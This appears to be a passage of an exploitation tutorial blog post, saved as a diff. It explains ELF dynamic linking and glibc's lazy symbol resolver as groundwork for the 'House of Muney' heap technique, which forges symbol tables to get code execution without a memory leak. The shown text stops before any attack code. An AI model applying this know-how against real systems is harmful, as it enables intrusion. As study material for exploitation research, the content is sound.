@@ -1,0 +1,3982 @@
+House of Muney | Axura
+
+#define LABYRINTH (void *)alloc_page(GFP_ATOMIC)
+
+Whether to log in now?
+
+Binex
+Heap
+
+Stack
+
+Fuzzing
+
+Glibc
+
+Kernel
+
+Qemu
+
+WEB
+
+Writeups
+HTB
+
+CTFs
+
+Hacktag
+
+House of Muney
+
+Axura · 2025-05-15 · 5,506 Views
+
+pwndbg> info breakpoints
+
+TL;DR
+Dynamic Linking
+
+ELF Header
+
+Section View (Static)
+Segment View (Dynamic)
+Segment-to-Section Mapping
+Section .dynamic
+String & Symbol Table
+Relocation Table
+PLT & GOT
+Symbol Resolution
+
+_dl_runtime_resolve
+_dl_fixup
+_dl_lookup_symbol_x
+do_lookup_x
+Attack Chain
+
+1. Initial mmap Allocation
+2. Fake Size Expansion
+3. Free the Mapping
+4. Reclaim the Region
+5. Forge glibc Structures
+
+a) Bloom Filter
+b) Bucket Table
+c) Hash Chain Table
+d) Sym Table
+e) String Table
+6. Trigger Symbol Resolution
+Look Inside
+
+Libc Offsets
+Dynsym Offsets
+
+_r_debug
+r_map
+l_info[]
+.dynsym
+
+st_value
+st_name
+st_info
+st_other
+st_shndx
+st_size
+GNU Hash Offsets
+Demo "exit"
+
+Environment
+Runtime Resolver
+Symbols Inspection
+Inside do_lookup_x
+
+bitmask_word
+bucket
+hasharr
+PoC
+
+PoC | Glibc 2.31
+
+Environment
+Needed Constants
+
+Function Offsets
+Target Offsets
+Symbol Table
+Others
+
+bitmask_word
+bucket
+hasharr
+PoC Script
+Pwn
+Challenges
+
+Libc Changes
+Side Effects
+Final Thoughts
+Reference
+TL;DR
+
+In my previous post — Pwn GOT: Hijack GOT/PLT Inside Glibc as RCE Primitives — we explored how to redirect execution flow by hijacking GOT and PLT entries. Specifically, we examined how unresolved GOT entries in glibc trigger a fallback to their associated PLT stub , which in turn invokes PLT0 , calling into the dynamic loader's runtime resolver , namely
+_dl_runtime_resolve_xsavec.
+
+At that time, we stated:
+
+We will not dive into the full internal details of how the dynamic resolver works in this post.
+
+In this post, we uncover the internals of the dynamic resolver , breaking down how it calculates and patches the actual function address. This is critical groundwork before exploring House of Muney — an exploitation technique where one can hijack memory within libc and manipulate the dynamic resolver to achieve arbitrary code execution.
+
+Two primary advantages define this technique: it completely bypasses ASLR and targets
+mmapchunks in glibc's
+malloc— no memory leak required .
+
+Maxwell , who coined the term House of Muney , outlines three distinct exploitation paths in his post :
+
+Mirror the libc sections byte-for-byte , then surgically alter the symbol table—a method favored by Qualys .
+
+Dissect the loader's flow in GDB , selectively writing only what's strictly necessary— Max 's chosen route.
+
+Deconstruct the mechanism entirely and reconstruct it with precision— reverse-engineering the symbol resolution and
+.gnu.hashlogic from the ground up.
+
+While Qualys brute-forged and Max debugged, I'm opting for the reversing beast —rebuilding the process deterministically, byte by byte—so we will be able to hijack any unresoved symbols from an external shared library.
+
+Dynamic Linking
+
+In contemporary Linux systems, ELF binaries are predominantly dynamically linked and loaded —a foundational principle every Linux hacker should internalize. For a thorough primer, refer to this article ; I won't rehash the basics here.
+
+ELF Header
+
+As any seasoned Linux hacker should know, the ELF header is the gateway—it's all the kernel needs to parse an ELF binary prior to loading and linking.
+
+Defined by the
+Elf64_Ehdrstructure, the ELF header outlines the fundamental blueprint of the file. But there's a duality here—two distinct “views” of the ELF:
+
+Static view : revolves around sections like
+.text,
+.data,
+.bss, and
+.dynamic—crafted for linkers and debuggers .
+
+Dynamic view : orchestrated through segments , including
+PT_LOADand
+PT_DYNAMIC, which the loader leverages at runtime .
+
+We can expose both layers using
+readelf, a trusty reconnaissance tool for binary inspection. To dump the ELF header of a dynamically linked binary:
+
+Bash
+
+readelf -h kxheap
+
+Sample output:
+
+ELF Header:
+  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
+  Class:                             ELF64
+  Data:                              2's complement, little endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              EXEC (Executable file)
+  Machine:                           Advanced Micro Devices X86-64
+  Version:                           0x1
+  Entry point address:               0x4010e0
+  Start of program headers:          64 (bytes into file)
+  Start of section headers:          25672 (bytes into file)
+  Flags:                             0x0
+  Size of this header:               64 (bytes)
+  Size of program headers:           56 (bytes)
+  Number of program headers:         15
+  Size of section headers:           64 (bytes)
+  Number of section headers:         36
+  Section header string table index: 35
+
+This tells us:
+
+The entry point of the binary (
+0x4010e0)
+
+The program header table starts at offset
+0x40and defines how the program is loaded into memory
+
+The section header table starts at offset
+0x6448and describes metadata used by debuggers and linkers
+
+This header is the launchpad —a concise, structured preview of how the binary will behave once in the wild.
+
+Section View (Static)
+
+To unveil the section headers —the linker's and debugger's perspective—we can run
+readelf -S:
+
+Bash
+
+readelf -S kxheap
+
+This reveals ELF's static anatomy. Key players include:
+
+.text– executable code segment
+
+.dynsym/
+.dynstr– dynamic symbols and strings
+
+.dynamic– metadata for the dynamic linker
+
+.rela.dyn,
+.rela.plt– relocation tables for runtime patching
+
+.got,
+.got.plt– Global Offset Table , the cornerstone of lazy binding
+
+.init_array,
+.fini_array– function pointers for constructors and destructors
+
+.bss– the zero-initialized data section, occupying memory but not disk
+
+Example output:
+
+There are 36 section headers, starting at offset 0x6448:
+
+Section Headers:
+  [Nr] Name              Type             Address           Offset
+       Size              EntSize          Flags  Link  Info  Align
+  [ 0]                   NULL             0000000000000000  00000000
+       0000000000000000  0000000000000000           0     0     0
+  [ 1] .note.gnu.pr[...] NOTE             00000000003fe388  00000388
+       0000000000000040  0000000000000000   A       0     0     8
+  [ 2] .note.gnu.bu[...] NOTE             00000000003fe3c8  000003c8
+       0000000000000024  0000000000000000   A       0     0     4
+  [ 3] .interp           PROGBITS         00000000003fe3f0  000003f0
+       000000000000000d  0000000000000000   A       0     0     8
+  [ 4] .gnu.hash         GNU_HASH         00000000003fe400  00000400
+       0000000000000030  0000000000000000   A       5     0     8
+  [ 5] .dynsym           DYNSYM           00000000003fe430  00000430
+       00000000000001c8  0000000000000018   A       6     1     8
+  [ 6] .dynstr           STRTAB           00000000003fe5f8  000005f8
+       0000000000000105  0000000000000000   A       0     0     8
+  [ 7] .dynamic          DYNAMIC          00000000003fe700  00000700
+       00000000000001e0  0000000000000010  WA       6     0     8
+  [ 8] .gnu.version      VERSYM           00000000004006be  000026be
+       0000000000000026  0000000000000002   A       5     0     2
+  [ 9] .gnu.version_r    VERNEED          00000000004006e8  000026e8
+       0000000000000050  0000000000000000   A       6     1     8
+  [10] .rela.dyn         RELA             0000000000400738  00002738
+       00000000000000a8  0000000000000018   A       5     0     8
+  [11] .rela.plt         RELA             00000000004007e0  000027e0
+       0000000000000108  0000000000000018  AI       5    23     8
+  [12] .init             PROGBITS         0000000000401000  00003000
+       000000000000001b  0000000000000000  AX       0     0     4
+  [13] .plt              PROGBITS         0000000000401020  00003020
+       00000000000000c0  0000000000000010  AX       0     0     16
+  [14] .text             PROGBITS         00000000004010e0  000030e0
+       00000000000004a9  0000000000000000  AX       0     0     16
+  [15] .fini             PROGBITS         000000000040158c  0000358c
+       000000000000000d  0000000000000000  AX       0     0     4
+  [16] .rodata           PROGBITS         0000000000402000  00004000
+       0000000000000200  0000000000000000   A       0     0     8
+  [17] .eh_frame_hdr     PROGBITS         0000000000402200  00004200
+       000000000000005c  0000000000000000   A       0     0     4
+  [18] .eh_frame         PROGBITS         0000000000402260  00004260
+       000000000000014c  0000000000000000   A       0     0     8
+  [19] .note.ABI-tag     NOTE             00000000004023ac  000043ac
+       0000000000000020  0000000000000000   A       0     0     4
+  [20] .init_array       INIT_ARRAY       0000000000403de8  00004de8
+       0000000000000008  0000000000000008  WA       0     0     8
+  [21] .fini_array       FINI_ARRAY       0000000000403df0  00004df0
+       0000000000000008  0000000000000008  WA       0     0     8
+  [22] .got              PROGBITS         0000000000403fc8  00004fc8
+       0000000000000020  0000000000000008  WA       0     0     8
+  [23] .got.plt          PROGBITS         0000000000403fe8  00004fe8
+       0000000000000070  0000000000000008  WA       0     0     8
+  [24] .data             PROGBITS         0000000000404058  00005058
+       0000000000000010  0000000000000000  WA       0     0     8
+  [25] .bss              NOBITS           0000000000404080  00005068
+       0000000000000340  0000000000000000  WA       0     0     32
+  [26] .comment          PROGBITS         0000000000000000  00005068
+       000000000000001b  0000000000000001  MS       0     0     1
+  [27] .debug_aranges    PROGBITS         0000000000000000  00005083
+       0000000000000030  0000000000000000           0     0     1
+  [28] .debug_info       PROGBITS         0000000000000000  000050b3
+       0000000000000568  0000000000000000           0     0     1
+  [29] .debug_abbrev     PROGBITS         0000000000000000  0000561b
+       00000000000001b1  0000000000000000           0     0     1
+  [30] .debug_line       PROGBITS         0000000000000000  000057cc
+       000000000000012c  0000000000000000           0     0     1
+  [31] .debug_str        PROGBITS         0000000000000000  000058f8
+       00000000000002a4  0000000000000001  MS       0     0     1
+  [32] .debug_line_str   PROGBITS         0000000000000000  00005b9c
+       00000000000000c4  0000000000000001  MS       0     0     1
+  [33] .symtab           SYMTAB           0000000000000000  00005c60
+       0000000000000438  0000000000000018          34     6     8
+  [34] .strtab           STRTAB           0000000000000000  00006098
+       0000000000000245  0000000000000000           0     0     1
+  [35] .shstrtab         STRTAB           0000000000000000  000062dd
+       0000000000000166  0000000000000000           0     0     1
+Key to Flags:
+  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
+  L (link order), O (extra OS processing required), G (group), T (TLS),
+  C (compressed), x (unknown), o (OS specific), E (exclude),
+  D (mbind), l (large), p (processor specific)
+
+Notably, sections like
+.dynamicare never interpreted directly by the loader . Instead, they're accessed indirectly through segments —in this case, the dynamic linker reads the
+PT_DYNAMICsegment, which happens to reference the
+.dynamicsection. The loader's world revolves around segments , not sections.
+
+In essence, this view is the blueprint of binary metadata —a static snapshot before any runtime magic kicks in.
+
+Segment View (Dynamic)
+
+To expose the loader's blueprint , we pivot to the segment view. Use
+readelf -lto dump the program headers —these dictate how the OS maps the ELF file into memory:
+
+Bash
+
+readelf -l kxheap
+
+Sample output:
+
+Elf file type is EXEC (Executable file)
+Entry point 0x4010e0
+There are 15 program headers, starting at offset 64
+
+Program Headers:
+  Type           Offset             VirtAddr           PhysAddr
+                 FileSiz            MemSiz              Flags  Align
+  PHDR           0x0000000000000040 0x00000000003fe040 0x00000000003fe040
+                 0x0000000000000348 0x0000000000000348  R      0x8
+  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
+                 0x0000000000000000 0x0000000000000000  RW     0x10
+  LOAD           0x0000000000000000 0x00000000003fe000 0x00000000003fe000
+                 0x00000000000008e0 0x00000000000008e0  RW     0x1000
+  NOTE           0x0000000000000388 0x00000000003fe388 0x00000000003fe388
+                 0x0000000000000040 0x0000000000000040  R      0x8
+  GNU_PROPERTY   0x0000000000000388 0x00000000003fe388 0x00000000003fe388
+                 0x0000000000000040 0x0000000000000040  R      0x8
+  NOTE           0x00000000000003c8 0x00000000003fe3c8 0x00000000003fe3c8
+                 0x0000000000000024 0x0000000000000024  R      0x4
+  INTERP         0x00000000000003f0 0x00000000003fe3f0 0x00000000003fe3f0
+                 0x000000000000000d 0x000000000000000d  R      0x1
+      [Requesting program interpreter: ./ld-2.35.so]
+  DYNAMIC        0x0000000000000700 0x00000000003fe700 0x00000000003fe700
+                 0x00000000000001e0 0x00000000000001e0  RW     0x8
+  LOAD           0x00000000000026be 0x00000000004006be 0x00000000004006be
+                 0x000000000000022a 0x000000000000022a  R      0x1000
+  LOAD           0x0000000000003000 0x0000000000401000 0x0000000000401000
+                 0x0000000000000599 0x0000000000000599  R E    0x1000
+  LOAD           0x0000000000004000 0x0000000000402000 0x0000000000402000
+                 0x00000000000003cc 0x00000000000003cc  R      0x1000
+  GNU_EH_FRAME   0x0000000000004200 0x0000000000402200 0x0000000000402200
+                 0x000000000000005c 0x000000000000005c  R      0x4
+  NOTE           0x00000000000043ac 0x00000000004023ac 0x00000000004023ac
+                 0x0000000000000020 0x0000000000000020  R      0x4
+  LOAD           0x0000000000004de8 0x0000000000403de8 0x0000000000403de8
+                 0x0000000000000280 0x00000000000005d8  RW     0x1000
+  GNU_RELRO      0x0000000000004de8 0x0000000000403de8 0x0000000000403de8
+                 0x0000000000000218 0x0000000000000218  R      0x1
+
+ Section to Segment mapping:
+  Segment Sections...
+   00
+   01
+   02     .note.gnu.property .note.gnu.build-id .interp .gnu.hash .dynsym .dynstr .dynamic
+   03     .note.gnu.property
+   04     .note.gnu.property
+   05     .note.gnu.build-id
+   06     .interp
+   07     .dynamic
+   08     .gnu.version .gnu.version_r .rela.dyn .rela.plt
+   09     .init .plt .text .fini
+   10     .rodata .eh_frame_hdr .eh_frame .note.ABI-tag
+   11     .eh_frame_hdr
+   12     .note.ABI-tag
+   13     .init_array .fini_array .got .got.plt .data .bss
+   14     .init_array .fini_array .got
+
+Each
+Program Headeris a runtime directive —not metadata. It tells the kernel what to load, where to load it, and how to protect it.
+
+The following line is the linchpin of dynamic linking:
+
+Type           Offset   VirtAddr   ...   Flags
+DYNAMIC        0x700    0x3fe700   ...   RW
+
+This is the
+PT_DYNAMICsegment (type
+2), which contains an array of
+Elf64_Dynentries . This array encodes everything the dynamic linker needs to:
+
+Discover required shared libraries
+
+Locate dynamic symbol and string tables
+
+Apply relocations
+
+Patch the GOT
+
+Resolve symbols lazily or eagerly at runtime
+
+In the
+<elf.h>header (used in both glibc and Linux kernel sources), we'll find:
+
+C
+
+#define PT_NULL    0           /* Program header table entry unused */
+#define PT_LOAD    1           /* Loadable program segment */
+#define PT_DYNAMIC 2           /* Dynamic linking information */
+#define PT_INTERP  3           /* Program interpreter */
+#define PT_NOTE    4           /* Auxiliary information */
+...
+
+In essence, this segment drives the linking process at runtime —it's the dynamic linker's map of the battlefield.
+
+Another critical entry is:
+
+Type           Offset             VirtAddr           PhysAddr
+             FileSiz            MemSiz              Flags  Align
+INTERP         0x00000000000003f0 0x00000000003fe3f0 0x00000000003fe3f0
+               0x000000000000000d 0x000000000000000d  R      0x1
+  [Requesting program interpreter: ./ld-2.35.so]
+
+This
+PT_INTERPsegment declares which interpreter should take over after the kernel loads the binary: here, it's
+ld-2.35.so. If this segment is missing, the binary is statically linked —no dynamic resolution happens.
+
+And here's the kicker: though sections like
+.dynamicexist, they are never parsed directly . Instead, segments like
+PT_DYNAMIChappen to point to those sections. The loader doesn't care about names—it follows raw memory offsets, sizes, and flags defined in the program headers.
+
+The segment view is the execution blueprint , while the section view is a relic of the build process —useful to compilers, linkers, and reverse engineers, but irrelevant to the loader.
+
+Segment-to-Section Mapping
+
+At the tail end of the
+readelf -loutput, we're given a section-to-segment mapping —a translation key between the static and dynamic views:
+
+Section to Segment mapping:
+   ...
+   07     .dynamic
+
+This tells us that
+.dynamicis encompassed by segment 07 , which we've identified as a
+PT_DYNAMICsegment type. This connection is crucial: it confirms that the loader will interpret the memory at this segment's location as an array of
+Elf64_Dynstructures—not because it's named
+.dynamic, but because it's referenced by a
+PT_DYNAMICentry.
+
+Inside that array are dynamic tags like:
+
+DT_NEEDED— names of required shared libraries
+
+DT_SYMTAB/
+DT_STRTAB— pointers to symbol and string tables
+
+DT_JMPREL,
+DT_PLTGOT,
+DT_RELA— relocation and GOT info
+
+DT_NULL— terminator for the array
+
+These tags (defined in
+<elf.h>from line 850 ) refer to different types of sections. In the exploit of House of Muney , we will focus on:
+
+C
+
+/* Legal values for d_tag (dynamic entry type).  */
+
+#define DT_HASH		4		/* Address of symbol hash table */
+#define DT_STRTAB	5		/* Address of string table */
+#define DT_SYMTAB	6		/* Address of symbol table */
+
+Section .dynamic
+
+To inspect the
+.dynamicsection itself—where the runtime metadata resides—we use
+readelf -d:
+
+Bash
+
+readelf -d kxheap
+
+Sample output:
+
+Dynamic section at offset 0x700 contains 25 entries:
+  Tag        Type                         Name/Value
+ 0x000000000000001d (RUNPATH)            Library runpath: [.]
+ 0x0000000000000001 (NEEDED)             Shared library: [libc-2.35.so]
+ 0x000000000000000c (INIT)               0x401000
+ 0x000000000000000d (FINI)               0x40158c
+ 0x0000000000000019 (INIT_ARRAY)         0x403de8
+ 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
+ 0x000000000000001a (FINI_ARRAY)         0x403df0
+ 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
+ 0x000000006ffffef5 (GNU_HASH)           0x3fe400
+ 0x0000000000000005 (STRTAB)             0x3fe5f8
+ 0x0000000000000006 (SYMTAB)             0x3fe430
+ 0x000000000000000a (STRSZ)              261 (bytes)
+ 0x000000000000000b (SYMENT)             24 (bytes)
+ 0x0000000000000015 (DEBUG)              0x0
+ 0x0000000000000003 (PLTGOT)             0x403fe8
+ 0x0000000000000002 (PLTRELSZ)           264 (bytes)
+ 0x0000000000000014 (PLTREL)             RELA
+ 0x0000000000000017 (JMPREL)             0x4007e0
+ 0x0000000000000007 (RELA)               0x400738
+ 0x0000000000000008 (RELASZ)             168 (bytes)
+ 0x0000000000000009 (RELAENT)            24 (bytes)
+ 0x000000006ffffffe (VERNEED)            0x4006e8
+ 0x000000006fffffff (VERNEEDNUM)         1
+ 0x000000006ffffff0 (VERSYM)             0x4006be
+ 0x0000000000000000 (NULL)               0x0
+
+Each entry represents a directive for the dynamic linker. What we see here are the decoded contents of the
+PT_DYNAMICsegment: an array of
+Elf64_Dynstructs .
+
+According to the Linux Foundation's ELF specification , if an object file is dynamically linked, its program header table must contain an entry of type
+PT_DYNAMIC. This segment refers to the
+.dynamicsection
+
+Each of the
+unionstructs describes a key-value pair that instructs the dynamic linker on how to perform linking at runtime:
+
+C
+
+typedef struct {
+	Elf64_Sxword	d_tag;
+   	union {
+   		Elf64_Xword	d_val;
+   		Elf64_Addr	d_ptr;
+	} d_un;
+} Elf64_Dyn;
+
+extern Elf64_Dyn	_DYNAMIC[];
+
+As seen from the last line, the array (
+_DYNAMIC[]) is exposed through the
+_DYNAMICsymbol and interpreted by the dynamic linker at runtime. Each entry is effectively a key-value pair :
+
+d_tagis the key , such as
+DT_NEEDED,
+DT_STRTAB, or
+DT_SYMTAB
+
+d_un.d_valor
+d_un.d_ptrholds the value , either a virtual address (
+d_ptr) or immediate value (
+d_val)
+
+These virtual addresses are not file offsets . We must use the
+PT_LOADsegments in the program headers to translate them to file positions when patching or analyzing statically.
+
+We'll primarily focus on:
+
+DT_STRTAB: Points to the string table (used to decode symbol names)
+
+DT_SYMTAB: Points to the symbol table (each entry is an
+Elf64_Sym)
+
+These two form the core of symbol resolution , and ultimately become the heart of hijacking techniques like House of Muney .
+
+String & Symbol Table
+
+The
+DT_STRTABand
+DT_SYMTABentries in
+.dynamicpoint to two cornerstone structures in ELF dynamic linking:
+
+String table — a flat memory block of null-terminated names, each symbol name stored consecutively
+
+Symbol table — an array of
+Elf64_Symstructs, each encoding metadata about a symbol (function, variable, type, size, etc.)
+
+Each symbol entry is is defined in
+<elf.h>at line 529 as:
+
+C
+
+typedef struct
+{
+  Elf64_Word	st_name;		  /* Symbol name (string tbl index) */
+  unsigned char	st_info;		/* Symbol type and binding */
+  unsigned char st_other;		/* Symbol visibility */
+  Elf64_Section	st_shndx;		/* Section index */
+  Elf64_Addr	st_value;		  /* Symbol value */
+  Elf64_Xword	st_size;		  /* Symbol size */
+} Elf64_Sym;
+
+Key Fields, Hacker's Perspective:
+
+st_nameis an 4-byte offset into the string table , not a direct pointer. It tells us where the symbol name starts within the string table—Change this, and we redefine the name of the symbol. Classic vector for symbol spoofing .
+
+st_valuerepresents the virtual address of the symbol. If the binary is compiled as PIE (position-independent executable), or OS with ASLR enabled, the actual runtime address will be:
+symbol_runtime_addr = base_addr + st_value
+
+st_infoencodes both the symbol's type (function, object, etc.) and binding (local, global, etc.) in a single byte, using macros
+ELF64_ST_BIND()and
+ELF64_ST_TYPE()to extract them cleanly.
+
+Together, the symbol table and string table allow the dynamic linker to:
+
+Locate the correct symbol by name
+
+Look up its value
+
+Perform necessary relocations at runtime
+
+From an exploit angle, corrupting or crafting a fake
+Elf64_Symor forging a controlled string table opens the door to arbitrary symbol resolution. That's the payload core in House of Muney —twisting the linker's logic into resolving our rogue function instead of the legit one.
+
+Relocation Table
+
+While the symbol table defines what symbols exist and the string table tells us their names, the relocation table answers a far more tactical question: Where should those symbol addresses be patched into memory?
+
+To view relocation entries in an ELF binary, use
+readelf -r:
+
+Bash
+
+readelf -r kxheap
+
+Sample output:
+
+Relocation section '.rela.dyn' at offset 0x2738 contains 7 entries:
+  Offset          Info           Type           Sym. Value    Sym. Name + Addend
+000000403fc8  000200000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0
+000000403fd0  000300000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTM[...] + 0
+000000403fd8  000b00000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
+000000403fe0  000f00000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0
+000000404080  001000000005 R_X86_64_COPY     0000000000404080 stdout@GLIBC_2.2.5 + 0
+000000404090  001100000005 R_X86_64_COPY     0000000000404090 stdin@GLIBC_2.2.5 + 0
+0000004040a0  001200000005 R_X86_64_COPY     00000000004040a0 stderr@GLIBC_2.2.5 + 0
+
+Relocation section '.rela.plt' at offset 0x27e0 contains 11 entries:
+  Offset          Info           Type           Sym. Value    Sym. Name + Addend
+000000404000  000100000007 R_X86_64_JUMP_SLO 0000000000000000 free@GLIBC_2.2.5 + 0
+000000404008  000400000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
+000000404010  000500000007 R_X86_64_JUMP_SLO 0000000000000000 write@GLIBC_2.2.5 + 0
+000000404018  000600000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
+000000404020  000700000007 R_X86_64_JUMP_SLO 0000000000000000 setbuf@GLIBC_2.2.5 + 0
+000000404028  000800000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
+000000404030  000900000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0
+000000404038  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
+000000404040  000c00000007 R_X86_64_JUMP_SLO 0000000000000000 malloc@GLIBC_2.2.5 + 0
+000000404048  000d00000007 R_X86_64_JUMP_SLO 0000000000000000 __isoc99_scanf@GLIBC_2.7 + 0
+000000404050  000e00000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
+
+We see two major sections:
+
+.rela.dyn: handles relocations for data symbols (globals, TLS, etc.)
+
+.rela.plt: handles relocations for functions , resolved via the PLT/GOT mechanism
+
+Under the hood, these are defined by structures in
+<elf.h>. For non-RELA relocations (rare on x86_64) at line 645 :
+
+C
+
+typedef struct
+{
+  Elf64_Addr	r_offset;		/* Address */
+  Elf64_Xword	r_info;			/* Relocation type and symbol index */
+} Elf64_Rel;
+
+For x86_64 and most modern systems, we use the RELA variant (with an explicit addend), defined at line 660 :
+
+C
+
+typedef struct
+{
+  Elf64_Addr	r_offset;		/* Address */
+  Elf64_Xword	r_info;			/* Relocation type and symbol index */
+  Elf64_Sxword	r_addend;		/* Addend */
+} Elf64_Rela;
+
+These entries are used by the dynamic linker (
+ld.so) during program startup or lazy binding.
+
+Anatomy of a relocation entry:
+
+r_offset: The destination address where the relocation should be applied — typically a GOT entry.
+
+r_info: A packed field that encodes both:
+The relocation type (e.g.,
+R_X86_64_JUMP_SLOT,
+R_X86_64_GLOB_DAT, etc.)
+
+The symbol index into the dynamic symbol table (
+DT_SYMTAB)
+
+r_addend: A constant value to add to the resolved symbol (used in RELA-type relocations)
+
+We can decode
+r_info(
+typedef uint64_t Elf64_Xword) like the following pseudocode::
+
+symbol_index = r_info >> 32;
+reloc_type   = r_info & 0xffffffff;
+
+Common Relocation Types:
+
+R_X86_64_JUMP_SLOT (7): Used in
+.rela.pltfor lazy binding of functions.
+
+R_X86_64_GLOB_DAT (6): Used to update GOT entries with resolved addresses of global data symbols.
+
+R_X86_64_COPY (5):Static copy of variables from shared library into the binary (e.g., for
+stdout,
+stdin,
+stderr).
+
+In the House of Muney , fake relocation entries are paired with forged symbols and strings to bend the dynamic linker's logic to resolve attacker-controlled function names , enabling code execution without direct GOT overwrites.
+
+PLT & GOT
+
+I've already covered the full mechanics of lazy symbol resolution in another post — Pwn GOT: Hijack GOT/PLT Inside Glibc as RCE Primitives — so we won't repeat all the internals here.
+
+In short, when a dynamically linked function is called for the first time, its GOT entry points to a trampoline in the PLT , which redirects control to the dynamic resolver .
+
+At that point, the GOT entry contains code (at the corresponding PLT entry) equivalent to:
+
+ASM
+
+push n           ; relocation table index (symbol index)
+jmp  plt[0]      ; jumps into the dynamic resolver
+
+And
+plt[0]looks like:
+
+ASM
+
+push ModuleID    ; address of the current binary's link_map
+jmp _dl_runtime_resolve
+
+Sample code snippet from an unresolved GOT entry:
+
+An unresolved function on GOT such as:
+
+10:0080│  0x7ffff7e1a088 ([email protected]) —▸ 0x7ffff7c280f0 ◂— endbr64
+
+Pointing to its corresponding PLT entry:
+
+pwndbg> x/4i 0x7ffff7c28180
+0x7ffff7c28180:      endbr64
+0x7ffff7c28184:      push   0x5
+0x7ffff7c28189:      bnd jmp 0x7ffff7c28000
+0x7ffff7c2818f:      nop
+
+It jumps to PLT0 (
+plt[0]):
+
+pwndbg> x/3i 0x00007ffff7c28000
+0x7ffff7c28000:      push   QWORD PTR [rip+0x1f2002]        # 0x7ffff7e1a008
+0x7ffff7c28006:      bnd jmp QWORD PTR [rip+0x1f2003]        # 0x7ffff7e1a010
+0x7ffff7c2800d:      nop    DWORD PTR [rax]
+
+Referencing back at GOT0 (
+got[0]).
+
+Lazy Resolution Workflow (ELF-Level):
+
+Call through PLT → GOT → triggers
+plt[0]and calls
+_dl_runtime_resolve.
+
+Resolver uses the pushed
+n(relocation index) to locate the relocation entry in
+.rela.plt.
+
+Relocation entry gives:
+GOT address to patch
+
+Index into
+.dynsym(symbol table)
+
+Lookup symbol name from
+.dynstrusing
+st_name.
+
+Scan all loaded shared libraries (SO files) for a matching symbol.
+
+Retrieves
+st_valuefrom the symbol's entry — the symbol's virtual address offset.
+
+Computes the final address, writes it into the GOT.
+
+Restarts the original call — now directly jumps to the real address via the GOT.
+
+Symbol Resolution
+
+Once a PLT stub triggers lazy binding, execution enters the dynamic resolver chain :
+
+_dl_runtime_resolve
+         └───► _dl_fixup
+                    └───►_dl_lookup_symbol_x
+                               └───► do_lookup_x
+
+This sequence is the heart of dynamic symbol resolution —the attack surface leveraged by techniques like House of Muney .
+
+_dl_runtime_resolve
+
+After triggering a lazy binding via a PLT stub, control is transferred to the dynamic resolver:
+
+ASM
+
+push ModuleID    ; address of the binary's link_map, at _GLOBAL_OFFSET_TABLE_+8
+jmp _dl_runtime_resolve	; the resolver from ld.so, at _GLOBAL_OFFSET_TABLE_+16
+
+On x86_64 with CET, this entry is actually
+_dl_runtime_resolve_xsavec. We can inspect it in GDB and annotate its responsibilities:
+
+ASM
+
+; Save volatile registers and state
+<+0>:     endbr64
+<+4>:     push   rbx
+<+5>:     mov    rbx,rsp
+<+8>:     and    rsp,0xffffffffffffffc0
+<+12>:    sub    rsp,QWORD PTR [rip+0x23f4d]        # 0x7ffff7ffcc90 <_rtld_global_ro+432>
+<+19>:    mov    QWORD PTR [rsp],rax
+<+23>:    mov    QWORD PTR [rsp+0x8],rcx
+<+28>:    mov    QWORD PTR [rsp+0x10],rdx
+<+33>:    mov    QWORD PTR [rsp+0x18],rsi
+<+38>:    mov    QWORD PTR [rsp+0x20],rdi
+<+43>:    mov    QWORD PTR [rsp+0x28],r8
+<+48>:    mov    QWORD PTR [rsp+0x30],r9
+<+53>:    mov    eax,0xee
+<+58>:    xor    edx,edx
+<+60>:    mov    QWORD PTR [rsp+0x250],rdx
+<+68>:    mov    QWORD PTR [rsp+0x258],rdx
+<+76>:    mov    QWORD PTR [rsp+0x260],rdx
+<+84>:    mov    QWORD PTR [rsp+0x268],rdx
+<+92>:    mov    QWORD PTR [rsp+0x270],rdx
+<+100>:   mov    QWORD PTR [rsp+0x278],rdx
+<+108>:   xsavec [rsp+0x40]		; save FPU/SIMD state
+
+; extract arguments passed by PLT stub
+<+113>:   mov    rsi,QWORD PTR [rbx+0x10]		; reloc_arg (from 'push n')
+<+117>:   mov    rdi,QWORD PTR [rbx+0x8]		; link_map address (from 'push ModuleID')
+
+; call the real fixup function
+<+121>:   call   0x7ffff7fd5e70 <_dl_fixup>
+<+126>:   mov    r11,rax						; get resolved address
+<+129>:   mov    eax,0xee
+<+134>:   xor    edx,edx
+<+136>:   xrstor [rsp+0x40]
+<+141>:   mov    r9,QWORD PTR [rsp+0x30]
+<+146>:   mov    r8,QWORD PTR [rsp+0x28]
+<+151>:   mov    rdi,QWORD PTR [rsp+0x20]
+<+156>:   mov    rsi,QWORD PTR [rsp+0x18]
+<+161>:   mov    rdx,QWORD PTR [rsp+0x10]
+<+166>:   mov    rcx,QWORD PTR [rsp+0x8]
+<+171>:   mov    rax,QWORD PTR [rsp]
+<+175>:   mov    rsp,rbx
+<+178>:   mov    rbx,QWORD PTR [rsp]
+<+182>:   add    rsp,0x18
+<+186>:   jmp    r11							  ; jump to the actual function
+
+I have sort out the procedures in the comments in the assembly. What Just Happened?
+
+The PLT stub had pushed two arguments:
+
+ModuleID→ address of the
+link_map(from GOT+8)
+
+reloc_index(
+n) → the relocation index into
+.rela.plt(from corresponding PLT entry)
+
+_dl_runtime_resolve_xsavecsaved context, called
+_dl_fixup(link_map, reloc_index)
+
+It then jumped to the resolved function, bypassing the PLT on future calls.
+
+_dl_fixup
+
+The upper part of
